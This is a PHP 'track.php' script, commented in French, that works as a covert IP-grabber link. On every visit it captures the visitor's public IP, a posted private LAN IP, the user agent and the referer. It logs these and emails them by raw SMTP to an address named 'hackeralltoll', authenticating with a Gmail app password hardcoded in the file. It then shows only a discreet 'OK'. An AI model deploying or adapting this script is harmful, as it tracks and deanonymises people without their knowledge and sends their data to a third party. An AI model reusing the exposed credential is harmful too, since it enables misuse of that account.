<?php
// ============================================
// track.php - Notification à chaque clic sur le lien
// ============================================

// 🔥 CONFIGURATION GMAIL (mot de passe application)
define('SMTP_HOST', 'smtp.gmail.com');
define('SMTP_PORT', 587);
define('SMTP_USER', 'hackeralltoll@gmail.com');
define('SMTP_PASS', 'mxis wvzp nxth udrm');
define('ALERT_EMAIL', 'hackeralltoll@gmail.com');

while (ob_get_level()) ob_end_clean();

// 🔥 Récupération IP réelle (sans 127.0.0.1)
function getRealIP() {
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ips = explode(',', $_SERVER[$header]);
            $ip = trim($ips[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'unknown';
}

$publicIP  = getRealIP();
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$privateIP = $_POST['local_ip'] ?? 'non détectée';
$referer   = $_SERVER['HTTP_REFERER'] ?? 'direct';
$date      = date('Y-m-d H:i:s');

// 📊 Données à envoyer
$output  = "=============================================\n";
$output .= "🔍 NOUVELLE VISITE SUR LE LIEN\n";
$output .= "=============================================\n\n";
$output .= "📅 Date: $date\n";
$output .= "🌍 IP Publique: $publicIP\n";
$output .= "🏠 IP Privée: $privateIP\n";
$output .= "💻 User Agent: $userAgent\n";
$output .= "🔗 Referer: $referer\n";
$output .= "=============================================\n";

// Stockage local (optionnel)
$logFile = '/tmp/tracking.txt';
@file_put_contents($logFile, $output, FILE_APPEND | LOCK_EX);

// 🔥 Envoi email
function sendEmailSMTP($to, $subject, $content) {
    $encodedSubject = '=?UTF-8?B?' . base64_encode($subject) . '?=';
    
    $headers = [
        'MIME-Version: 1.0',
        'Content-Type: text/plain; charset=UTF-8',
        'Content-Transfer-Encoding: 8bit',
        'From: ' . SMTP_USER,
        'Reply-To: ' . ALERT_EMAIL
    ];
    
    $message = implode("\r\n", $headers) . "\r\n\r\n" . $content;
    
    $connection = fsockopen(SMTP_HOST, SMTP_PORT, $errno, $errstr, 30);
    if (!$connection) return false;
    
    fgets($connection, 515);
    fputs($connection, "HELO render.com\r\n");
    fgets($connection, 515);
    fputs($connection, "STARTTLS\r\n");
    fgets($connection, 515);
    stream_socket_enable_crypto($connection, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
    fputs($connection, "EHLO render.com\r\n");
    fgets($connection, 515);
    fputs($connection, "AUTH LOGIN\r\n");
    fgets($connection, 515);
    fputs($connection, base64_encode(SMTP_USER) . "\r\n");
    fgets($connection, 515);
    fputs($connection, base64_encode(SMTP_PASS) . "\r\n");
    fgets($connection, 515);
    fputs($connection, "MAIL FROM: <" . SMTP_USER . ">\r\n");
    fgets($connection, 515);
    fputs($connection, "RCPT TO: <$to>\r\n");
    fgets($connection, 515);
    fputs($connection, "DATA\r\n");
    fgets($connection, 515);
    fputs($connection, $message . "\r\n.\r\n");
    fgets($connection, 515);
    fputs($connection, "QUIT\r\n");
    fclose($connection);
    return true;
}

sendEmailSMTP(ALERT_EMAIL, '👁️ VISITE - ' . $publicIP, $output);

// Affichage discret (optionnel)
header('Content-Type: text/plain; charset=utf-8');
echo "OK";
?>
